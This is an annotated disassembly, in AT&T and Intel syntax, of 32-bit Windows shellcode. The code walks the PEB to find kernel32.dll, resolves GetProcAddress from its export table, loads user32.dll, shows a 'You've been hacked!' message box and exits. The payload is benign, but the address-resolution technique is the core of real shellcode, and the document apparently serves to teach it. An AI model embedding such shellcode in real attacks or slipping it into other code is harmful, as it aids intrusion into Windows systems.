
/**************************************************************************************************************************
						Disassembly in AT&T Syntax
***************************************************************************************************************************/

Section 1: Set up a new stack frame

   0: 31 c0                   xor    %eax,%eax            // EAX = 0
   1: 64 8b 60 08             mov    %fs:0x8(%eax),%esp   // Move Segment:Offset(base) to ESP
   2: 8d 2c 24                lea    (%esp),%ebp          // Load effective address specified by ESP to EBP (Creates virtual stack)

Section 2: Find kernel.dll base address

   3: 31 c0                  xor    %eax,%eax             // EAX = 0
   4: 64 8b 58 30            mov    %fs:0x30(%eax),%ebx   // EBX = PEB(Process Environment Block) // Using offset fs:0x30(Segment:offset)
   5: 8b 5b 0c               mov    0xc(%ebx),%ebx        // EBX = PEB_LDR_DATA // Using offset 0xc
   6: 8b 5b 14                mov    0x14(%ebx),%ebx      // EBX = LDR->InMemoryOrderModuleList // Using offset 0x14 (First list entry)
   7: 8b 1b                   mov    (%ebx),%ebx          // EBX = Second list entry (ntdll.dll)
   8: 8b 1b                   mov    (%ebx),%ebx          // EBX = Third list entry (kernel32.dll)
   9: 8b 5b 10                mov    0x10(%ebx),%ebx      // EBX = Base address of kernel32.dll // Using offset 0x10

Section 3: Get address of GetProcAddress

   10: 8b 53 3c                mov    0x3c(%ebx),%edx      // EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
   11: 01 da                   add    %ebx,%edx            // EDX = Address of PE signature = base address + RVA of PE signature
   12: 8b 52 78                mov    0x78(%edx),%edx      // EDX = RVA of Export Table = Address of PE + offset 0x78
   13: 01 da                   add    %ebx,%edx            // EDX = Address of Export Table = base address + RVA of export table
   14: 8b 72 20                mov    0x20(%edx),%esi      // ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
   15: 01 de                   add    %ebx,%esi            // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
   16: 31 c9                   xor    %ecx,%ecx            // ECX = 0

 loopSearch:
   17: 41                      inc    %ecx                  // Increment counter ECX
   18: ad                      lods   %ds:(%esi),%eax       // Load next list entry into EAX
   19: 01 d8                   add    %ebx,%eax             // EAX = Address of Entry = base address + Address of Entry
   20: 81 38 47 65 74 50       cmpl   $0x50746547,(%eax)    // Compare first byte to GetP
   21: 75 f4                   jne    loopSearch            // Start over if not equal
   22: 81 78 04 72 6f 63 41    cmpl   $0x41636f72,0x4(%eax) // Compare second byte to rocA
   23: 75 eb                   jne    loopSearch            // Start over if not equal

 GetProcAddressFunc:
   24: 8b 7a 24                mov    0x24(%edx),%edi     // EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
   25: 01 df                   add    %ebx,%edi           // EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
   26: 66 8b 0c 4f             mov    (%edi,%ecx,2),%cx   // CX = Number of Function = Address of Ordinal Table + Counter * 2
   27: 49                      dec    %ecx                // Decrement ECX (As name ordinals starts from 0)
   28: 8b 7a 1c                mov    0x1c(%edx),%edi     // EDI = Offset address table
   29: 01 df                   add    %ebx,%edi           // EDI = Offset address table
   30: 8b 3c 8f                mov    (%edi,%ecx,4),%edi  // EDI = Pointer(Offset)
   31: 01 df                   add    %ebx,%edi           // EDI = getProcAddress

Section 4: Use GetProcAddress to find the address of LoadLibrary Function

 getLoadLibraryA:
   32: 31 c9                   xor    %ecx,%ecx           // ECX = 0
   33: 51                      push   %ecx                // Push ECX onto stack
   34: 68 61 72 79 41          push   $0x41797261         //
   35: 68 4c 69 62 72          push   $0x7262694c         // AyrarbiLdaoL
   36: 68 4c 6f 61 64          push   $0x64616f4c         //
   37: 54                      push   %esp                // "LoadLibraryA"
   38: 53                      push   %ebx                // "Kernel32.dll"
   39: ff d7                   call   *%edi               // GetProcAddress(Kernel32.dll,LoadLibraryA)

Section 5: Use LoadLibrary to load user32.ntdll

 getUser32:
   40: 68 6c 6c 61 61          push   $0x61616c6c         // aall
   41: 66 81 6c 24 02 61 61    subw   $0x6161,0x2(%esp)   // Remove additional characters "aa"
   42: 68 33 32 2e 64          push   $0x642e3233         // d.32
   43: 68 55 73 65 72          push   $0x72657355         // resU
   44: 54                      push   %esp                // User32.dll
   45: ff d0                   call   *%eax               // Call LoadLibrary(User32.dll)

Section 6: Use GetProcAddress to find the address of MessageBox

  getMessageBox:
   46: 68 6f 78 41 61          push   $0x6141786f         // aAxo
   47: 66 83 6c 24 03 61       subw   $0x61,0x3(%esp)     // Remove additional character "a"
   48: 68 61 67 65 42          push   $0x42656761         // Bega
   49: 68 4d 65 73 73          push   $0x7373654d         // sseM
   50: 54                      push   %esp                // MessageBoxA
   51: 50                      push   %eax                // User32.dll
   52: ff d7                   call   *%edi               // GetProcAddress(User32.dll, MessageBoxA)

Section 7: Specify the function parameters

 MessageBoxA:
   54: 31 d2                   xor    %edx,%edx           // EDX = 0
   55: 52                      push   %edx                // Push NULL
   56: 68 6c 6f 69 74          push   $0x74696f6c         // ...
   57: 68 20 45 78 70          push   $0x70784520         // ...
   58: 68 6f 78 20 2d          push   $0x2d20786f         // ...
   59: 68 4d 73 67 42          push   $0x4267734d         // "MsgBox - Exploit"
   60: 89 e6                   mov    %esp,%esi           // EDI = Title
   61: 52                      push   %edx                // Push terminating byte
   62: 68 6b 65 64 21          push   $0x2164656b         // ...
   63: 68 20 68 61 63          push   $0x63616820         // ...
   64: 68 62 65 65 6e          push   $0x6e656562         // ...
   65: 68 27 76 65 20          push   $0x20657627         // ...
   66: 68 20 59 6f 75          push   $0x756f5920         // You've been hacked!
   67: 89 e1                   mov    %esp,%ecx           // ECX = Message

Section 8: Call the Function

   68: 6a 11                   push   $0x11               // Push Type (MB_OKCANCEL|MB_ICONWARNING)
   69: 56                      push   %esi                // Push Title
   70: 51                      push   %ecx                // Push Message
   71: 52                      push   %edx                // Push NULL for windowhandle
   72: ff d0                   call   *%eax               // MessageBoxA(windowhandle,msg,title,type)

Section 9: Get ExitProcess function address

   73: 83 c4 10                add    $0x10,%esp	  // Clean Stack
   74: 68 65 73 73 61          push   $0x61737365	  // asse
   75: 66 83 6c 24 03 61       subw   $0x61,0x3(%esp)	  // Remove the 'a'
   76: 68 50 72 6f 63          push   $0x636f7250	  // corP
   77: 68 45 78 69 74          push   $0x74697845	  // tixE
   78: 54                      push   %esp		  // "ExitProcess"
   79: 53                      push   %ebx		  // "Kernel32.dll"
   80: ff d7                   call   *%edi		  // GetProcAddress(Kernel32.dll, ExitProcess)

Section 10: Call the ExitProcess function

   81: 31 c9                   xor    %ecx,%ecx		  // ECX = 0
   82: 51                      push   %ecx		  // Push 0
   83: ff d0                   call   *%eax		  // ExitProcess(0)


/**************************************************************************************************************************
						Disassembly in Intel Syntax
***************************************************************************************************************************/


Section 1: Set up a new stack frame

	0: 31 c0                   xor    eax,eax			// Set eax to zero
	1: 64 8b 60 08             mov    esp, fs:[eax+0x8]		// Move Segment:Offset(base) to esp
	2: 8d 2c 24                lea    ebp,[esp]			// Load effective address specified by esp to ebp (Creates virtual stack)

Section 2: Find kernel32.dll base address

	3: 31 c0                  xor    eax,eax			// EAX = 0
	4: 64 8b 58 30            mov    ebx, fs:[eax+0x30]		// EBX = PEB(Process Environment Block) // Using offset fs:0x30 (Segment:offset)
	5: 8b 5b 0c               mov    ebx, [ebx+0xc]			// EBX = PEB_LDR_DATA // using offset 0xc
	6: 8b 5b 14                mov    ebx, [ebx+0x14]		// EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
	7: 8b 1b                   mov    ebx, [ebx]			// EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
	8: 8b 1b                   mov    ebx, [ebx]			// EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
	9: 8b 5b 10                mov    ebx, [ebx+0x10]		// EBX = base address of kernel32.dll // using offset 0x10 from EBX

Section 3: Get address of GetProcAddress

	10: 8b 53 3c                mov    edx, [ebx+0x3c]		// EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
	11: 01 da                   add    edx,ebx			// EDX = Address of PE signature = base address + RVA of PE signature
	12: 8b 52 78                mov    edx, [edx+0x78]		// EDX = RVA of Export Table = Address of PE + offset 0x78
	13: 01 da                   add    edx,ebx			// EDX = Address of Export Table = base address + RVA of export table
	14: 8b 72 20                mov    esi, [edx+0x20]		// ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
	15: 01 de                   add    esi,ebx			// ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
	16: 31 c9                   xor    ecx,ecx			// ECX = 0

  loopSearch:
	17: 41                      inc    ecx				// Increment Counter
	18: ad                      lods   eax,DWORD PTR ds:[esi]	// Load next entry in list into EAX
	19: 01 d8                   add    eax,ebx			// EAX = Address of entry = base address + Address of Entry
	20: 81 38 47 65 74 50       cmp    dword [eax],0x50746547	// Compare first byte to GetP
	21: 75 f4                   jne    loopSearch			// Start over if not equal
	22: 81 78 04 72 6f 63 41    cmp    dword [eax+0x4],0x41636f72	// Compare second byte to rocA
	23: 75 eb                   jne    loopSearch			// Start over if not equal

  getProcAddressFunc:
	24: 8b 7a 24                mov    edi, [edx+0x24] 		// EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
	25: 01 df                   add    edi,ebx			// EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
	26: 66 8b 0c 4f             mov    cx, [edi+ecx*2]		// CX = Number of Function = Address of Ordinal Table + Counter * 2
	27: 49                      dec    ecx				// Decrement ECX (As name ordinals starts from 0)
	28: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]	// EDI = RVA of AddressOfFunctions
	29: 01 df                   add    edi,ebx			// EDI = AddressOfFunctions
	30: 8b 3c 8f                mov    edi,DWORD PTR [edi+ecx*4]	// EDI = Pointer to required function (ECX * 4 because each pointer has 4 bytes)
	31: 01 df                   add    edi,ebx			// EDI = getProcAddress = base address + Pointer to required function

Section 4: Use GetProcAddress to find the address of LoadLibrary Function

  getLoadLibraryA:
	32: 31 c9                   xor    ecx,ecx			// ECX = 0
	33: 51                      push   ecx				// Push ECX onto stack
	34: 68 61 72 79 41          push   0x41797261			//
	35: 68 4c 69 62 72          push   0x7262694c			// AyrarbiLdaoL
	36: 68 4c 6f 61 64          push   0x64616f4c			//
	37: 54                      push   esp				// "LoadLibraryA"
	38: 53                      push   ebx				// "Kernel32.dll"
	39: ff d7                   call   edi				// GetProcAddress(Kernel32.dll,LoadLibraryA)

Section 5: Use LoadLibrary to load user32.ntdll

  getUser32:
	40: 68 6c 6c 61 61          push   0x61616c6c			// aall
	41: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161	// Remove additional characters "aa"
	42: 68 33 32 2e 64          push   0x642e3233			// d.32
	43: 68 55 73 65 72          push   0x72657355			// resU
	44: 54                      push   esp				// "User32.dll"
	45: ff d0                   call   eax				// Call LoadLibrary(User32.dll)

Section 6: Use GetProcAddress to find the address of MessageBox

  getMessageBox:
	46: 68 6f 78 41 61          push   0x6141786f			// aAxo
	47: 66 83 6c 24 03 61       sub    WORD PTR [esp+0x3],0x61	// Remove additional character "a"
	48: 68 61 67 65 42          push   0x42656761			// Bega
	49: 68 4d 65 73 73          push   0x7373654d			// sseM
	50: 54                      push   esp				// "MessageBoxA"
	51: 50                      push   eax				// "User.dll"
	52: ff d7                   call   edi				// GetProcAddress(User32.dll,MessageBoxA)

Section 7: Specify the function parameters

  MessageBoxA:
	53: 31 d2                   xor    edx,edx			// EDX = 0
	54: 52                      push   edx				// Push NULL
	55: 68 6c 6f 69 74          push   0x74696f6c			// ...
	56: 68 20 45 78 70          push   0x70784520			// ...
	57: 68 6f 78 20 2d          push   0x2d20786f			// ...
	58: 68 4d 73 67 42          push   0x4267734d			// "MsgBox - Exploit"
	59: 89 e6                   mov    esi,esp			// ESI = Title
	60: 52                      push   edx				// Push terminating byte
	61: 68 6b 65 64 21          push   0x2164656b			// ...
	62: 68 20 68 61 63          push   0x63616820			// ...
	63: 68 62 65 65 6e          push   0x6e656562			// ...
	64: 68 27 76 65 20          push   0x20657627			// ...
	65: 68 20 59 6f 75          push   0x756f5920			// "You've been hacked!"
	66: 89 e1                   mov    ecx,esp			// ECX = Message

Section 8: Call the function

	67: 6a 11                   push   0x11				// Push Type (MB_OKCANCEL|MB_ICONWARNING)
	68: 56                      push   esi				// Push Title
	69: 51                      push   ecx				// Push Message
	70: 52                      push   edx				// Push NULL for windowhandle
	71: ff d0                   call   eax				// MessageBoxA(windowhandle,msg,title,type)

Section 9: Get ExitProcess function address

    	72: 83 c4 10                add    esp,0x10			// Clean Stack
    	73: 68 65 73 73 61          push   0x61737365			// asse
    	74: 66 83 6c 24 03 61       sub    WORD PTR [esp+0x3],0x61	// Remove the 'a'
    	75: 68 50 72 6f 63          push   0x636f7250			// corP
    	76: 68 45 78 69 74          push   0x74697845			// tixE
    	77: 54                      push   esp				// "ExitProcess"
    	78: 53                      push   ebx				// "Kernel32.dll"
    	79: ff d7                   call   edi				// GetProcAddress(Kernel32.dll, ExitProcess)

Section 10: Call the ExitProcess function

    	80: 31 c9                   xor    ecx,ecx			// ECX = 0
    	81: 51                      push   ecx				// Push 0
    	82: ff d0                   call   eax				// ExitProcess(0)